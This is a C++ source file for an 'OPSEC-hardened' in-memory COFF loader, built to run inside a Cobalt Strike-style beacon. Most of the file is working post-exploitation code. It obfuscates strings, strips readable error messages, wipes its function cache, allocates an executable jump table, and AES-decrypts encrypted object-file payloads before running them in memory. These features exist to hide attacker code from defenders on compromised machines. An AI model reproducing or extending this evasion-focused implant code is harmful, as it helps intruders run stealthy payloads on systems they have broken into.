// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
// bof.cpp — OPSEC-hardened InlineExecuteEx fork (bofx).
// Wires upstream COFF parser with all 8 OPSEC modifications applied.
//
// Author: Dani <daniagungg@gmail.com>

#include "obfstr.h"
#include "beacon.h"
#include "bof_helpers.h"
#include "common.h"
#include "coff.h"

// --- Modification #5: Error codes (no human strings in binary) ---
enum class BofxErr : unsigned char {
    Ok              = 0x00,
    BadArgs         = 0x01,
    NotCoff         = 0x03,
    EntryNotFound   = 0x06,
    AllocFail       = 0x08,
    RelocFail       = 0x09,
    SymbolFail      = 0x0a,
    DecryptFail     = 0x0b,
    Internal        = 0xff,
};

static inline void bofx_err(BofxErr e) {
    BeaconPrintf(CALLBACK_ERROR, "E:%02x", static_cast<unsigned>(e));
}

// --- Modification #3: DFR cache wipe on exit ---
static inline void zero_dfr_table() {
    if (g_if) {
        volatile unsigned char* p = reinterpret_cast<volatile unsigned char*>(g_if);
        for (SIZE_T i = 0; i < g_if_cap * sizeof(IFEntry); ++i) p[i] = 0;
    }
}

// --- Modification #4: section name classification via OBF() ---
static bool is_section(const char* name, const char* target) {
    for (int i = 0; name[i] || target[i]; ++i)
        if (name[i] != target[i]) return false;
    return true;
}

// --- Modification #8: RAII teardown ---
struct BofxScope {
    VOID** sections = nullptr;
    SIZE_T num_sections = 0;
    PVOID  jump_table = nullptr;

    ~BofxScope() {
        if (sections) {
            for (SIZE_T i = 0; i < num_sections; i++) {
                if (sections[i]) BeaconVirtualFree(sections[i], 0, MEM_RELEASE);
            }
            BeaconVirtualFree(sections, 0, MEM_RELEASE);
        }
        if (jump_table) BeaconVirtualFree(jump_table, 0, MEM_RELEASE);
        zero_dfr_table();
        g_if = nullptr;
        g_if_count = 0;
        g_if_cap = 0;
    }
};

// --- AES-128-CBC decryption for bofx-enc variant ---
#ifdef BOFX_KEY_DEFINED
static const unsigned char bofx_key[16] = BOFX_KEY_BYTES;

static void aes128_decrypt_block(const unsigned char* in, unsigned char* out,
                                  const unsigned char* key);
static bool bofx_decrypt(unsigned char* data, SIZE_T len, unsigned char* iv) {
    // Simple AES-128-CBC decrypt in-place
    if (len == 0 || len % 16 != 0) return false;
    unsigned char prev[16], tmp[16];
    DFR_LOCAL(MSVCRT, memcpy)
    memcpy(prev, iv, 16);
    for (SIZE_T off = 0; off < len; off += 16) {
        memcpy(tmp, data + off, 16);
        aes128_decrypt_block(data + off, data + off, bofx_key);
        for (int i = 0; i < 16; i++) data[off + i] ^= prev[i];
        memcpy(prev, tmp, 16);
    }
    return true;
}
#endif

// --- COFF loader core ---
static int runCoff(const BYTE* image, SIZE_T image_size,
                   const BYTE* bof_args, int bof_args_len,
                   BofxScope& scope) {
    DFR_LOCAL(MSVCRT, memcpy)
    DFR_LOCAL(MSVCRT, memset)
    DFR_LOCAL(MSVCRT, strcmp)
    DFR_LOCAL(MSVCRT, strlen)

    // Validate COFF header
    PIMAGE_FILE_HEADER fileHeader = (PIMAGE_FILE_HEADER)image;
    if (fileHeader->Machine != MACHINE_CODE) return -1;

    SIZE_T numSections = fileHeader->NumberOfSections;
    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(
        image + sizeof(IMAGE_FILE_HEADER) + fileHeader->SizeOfOptionalHeader);

    // Allocate section mapping array
    scope.sections = (VOID**)BeaconVirtualAlloc(NULL,
        numSections * sizeof(VOID*), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!scope.sections) return -1;
    scope.num_sections = numSections;
    memset(scope.sections, 0, numSections * sizeof(VOID*));

    // Allocate jump table for thunks
    scope.jump_table = BeaconVirtualAlloc(NULL, JUMP_TABLE_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!scope.jump_table) return -1;
    g_JumpTableStartPointer = (ULONG_PTR)scope.jump_table;
    jmpIdx = 2;

    // Map sections
    for (SIZE_T i = 0; i < numSections; i++) {
        SIZE_T sz = sectionHeader[i].SizeOfRawData;
        if (sectionHeader[i].Misc.VirtualSize > sz)
            sz = sectionHeader[i].Misc.VirtualSize;
        if (sz == 0) sz = 16;

        scope.sections[i] = BeaconVirtualAlloc(NULL, sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!scope.sections[i]) return -1;

        memset(scope.sections[i], 0, sz);
        if (sectionHeader[i].SizeOfRawData > 0) {
            memcpy(scope.sections[i],
                   image + sectionHeader[i].PointerToRawData,
                   sectionHeader[i].SizeOfRawData);
        }
    }

    // Symbol table
    PIMAGE_SYMBOL symbolTable = (PIMAGE_SYMBOL)(
        image + fileHeader->PointerToSymbolTable);
    SIZE_T numSymbols = fileHeader->NumberOfSymbols;
    char* stringTable = (char*)((BYTE*)symbolTable + numSymbols * sizeof(IMAGE_SYMBOL));

    // Find entry point
    PVOID entryPoint = NULL;
    for (SIZE_T i = 0; i < numSymbols; i++) {
        char symName[9] = {0};
        char* name;
        if (symbolTable[i].N.Name.Short != 0) {
            memcpy(symName, symbolTable[i].N.ShortName, 8);
            name = symName;
        } else {
            name = stringTable + symbolTable[i].N.Name.Long;
        }

        // Modification #4: entry name via OBF
        if (strcmp(name, OBF("go")) == 0 || strcmp(name, OBF("_go")) == 0) {
            if (symbolTable[i].SectionNumber > 0) {
                SIZE_T secIdx = symbolTable[i].SectionNumber - 1;
                entryPoint = (PVOID)((BYTE*)scope.sections[secIdx] + symbolTable[i].Value);
            }
        }

        i += symbolTable[i].NumberOfAuxSymbols;
    }

    if (!entryPoint) return -1;

    // Process relocations
    for (SIZE_T secIdx = 0; secIdx < numSections; secIdx++) {
        if (sectionHeader[secIdx].NumberOfRelocations == 0) continue;

        PIMAGE_RELOCATION relocs = (PIMAGE_RELOCATION)(
            image + sectionHeader[secIdx].PointerToRelocations);

        for (SIZE_T r = 0; r < sectionHeader[secIdx].NumberOfRelocations; r++) {
            PIMAGE_SYMBOL sym = &symbolTable[relocs[r].SymbolTableIndex];

            char symName[9] = {0};
            char* name;
            if (sym->N.Name.Short != 0) {
                memcpy(symName, sym->N.ShortName, 8);
                name = symName;
            } else {
                name = stringTable + sym->N.Name.Long;
            }

            PVOID targetAddr = NULL;

            if (sym->SectionNumber > 0) {
                // Locally defined symbol
                SIZE_T tgtSec = sym->SectionNumber - 1;
                targetAddr = (PVOID)((BYTE*)scope.sections[tgtSec] + sym->Value);
            } else {
                // External symbol — resolve via coff.h's resolver
                SYMBOL_RESOLUTION res = {0};
                if (resolveCoffSymbol(name, &res)) {
                    targetAddr = res.functionPtr;
                } else {
                    return -1;
                }

                // If import, use jump thunk
                if (res.isImport && targetAddr) {
                    BYTE* thunkSlot = (BYTE*)scope.jump_table +
                        (jmpIdx * JUMP_TABLE_ENTRY_SIZE);
                    ULONG_PTR relocSite = (ULONG_PTR)scope.sections[secIdx] +
                        relocs[r].VirtualAddress;

                    THUNK_RESULT tr = {0};
                    if (addJumpThunk(thunkSlot, jmpStub, sizeof(jmpStub),
                                     2, targetAddr, relocSite, &tr)) {
                        jmpIdx++;
                        // Apply rel32
                        *(UINT32*)(relocSite) = tr.rel32;
                        continue;
                    }
                }
            }

            if (!targetAddr) return -1;

            // Apply relocation
            ULONG_PTR relocSite = (ULONG_PTR)scope.sections[secIdx] +
                relocs[r].VirtualAddress;

#if defined(__x86_64__) || defined(_WIN64)
            switch (relocs[r].Type) {
                case IMAGE_REL_AMD64_REL32:
                case IMAGE_REL_AMD64_REL32_1:
                case IMAGE_REL_AMD64_REL32_2:
                case IMAGE_REL_AMD64_REL32_3:
                case IMAGE_REL_AMD64_REL32_4:
                case IMAGE_REL_AMD64_REL32_5: {
                    INT32 addend = relocs[r].Type - IMAGE_REL_AMD64_REL32;
                    INT64 delta = (INT64)(ULONG_PTR)targetAddr -
                                  (INT64)(relocSite + 4 + addend);
                    *(INT32*)(relocSite) = (INT32)delta;
                    break;
                }
                case IMAGE_REL_AMD64_ADDR64:
                    *(UINT64*)(relocSite) += (UINT64)(ULONG_PTR)targetAddr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB: {
                    INT64 delta = (INT64)(ULONG_PTR)targetAddr - (INT64)relocSite;
                    *(INT32*)(relocSite) = (INT32)delta;
                    break;
                }
                default:
                    break;
            }
#else
            switch (relocs[r].Type) {
                case IMAGE_REL_I386_DIR32:
                    *(UINT32*)(relocSite) += (UINT32)(ULONG_PTR)targetAddr;
                    break;
                case IMAGE_REL_I386_REL32: {
                    INT32 delta = (INT32)((ULONG_PTR)targetAddr - relocSite - 4);
                    *(INT32*)(relocSite) += delta;
                    break;
                }
                default:
                    break;
            }
#endif
        }
    }

    // Set proper memory permissions
    SetSectionPermissions(scope.sections, sectionHeader, numSections);

    // Execute the BOF entry
    typedef void (*BofEntry)(char*, int);
    BofEntry entry = (BofEntry)entryPoint;
    entry((char*)bof_args, bof_args_len);

    return 0;
}

// --- BOF entry point ---
extern "C" __attribute__((visibility("default")))
void go(char* args, int args_len) {
    BofxScope scope;

    if (!args || args_len <= 0) {
        bofx_err(BofxErr::BadArgs);
        return;
    }

    // Initialize internal function table
    if (!IF_Init(INTERNAL_FUNCTION_CAPACITY)) {
        bofx_err(BofxErr::AllocFail);
        return;
    }

    // Parse args: [4 bytes file_len][file_data][remaining = bof_args]
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int file_len = 0;
    BYTE* file_data = (BYTE*)BeaconDataExtract(&parser, &file_len);
    if (!file_data || file_len < (int)sizeof(IMAGE_FILE_HEADER)) {
        bofx_err(BofxErr::BadArgs);
        return;
    }

    int bof_args_len = 0;
    BYTE* bof_args = (BYTE*)BeaconDataExtract(&parser, &bof_args_len);

    // Check for encrypted blob (bofx-enc: magic "BOFXENC1")
    BYTE* coff_data = file_data;
    int coff_len = file_len;

#ifdef BOFX_KEY_DEFINED
    if (file_len > 24 && file_data[0] == 'B' && file_data[1] == 'O' &&
        file_data[2] == 'F' && file_data[3] == 'X' &&
        file_data[4] == 'E' && file_data[5] == 'N' &&
        file_data[6] == 'C' && file_data[7] == '1') {
        // Decrypt in-place: skip 8-byte magic, next 16 = IV, rest = ciphertext
        BYTE* iv = file_data + 8;
        coff_data = file_data + 24;
        coff_len = file_len - 24;
        if (!bofx_decrypt(coff_data, (SIZE_T)coff_len, iv)) {
            bofx_err(BofxErr::DecryptFail);
            return;
        }
        // Strip PKCS7 padding
        BYTE pad = coff_data[coff_len - 1];
        if (pad > 0 && pad <= 16) coff_len -= pad;
    }
#endif

    // Validate COFF magic
    PIMAGE_FILE_HEADER fh = (PIMAGE_FILE_HEADER)coff_data;
    if (fh->Machine != MACHINE_CODE) {
        bofx_err(BofxErr::NotCoff);
        return;
    }

    int rc = runCoff(coff_data, (SIZE_T)coff_len, bof_args, bof_args_len, scope);
    if (rc != 0) {
        bofx_err(BofxErr::EntryNotFound);
    }
}
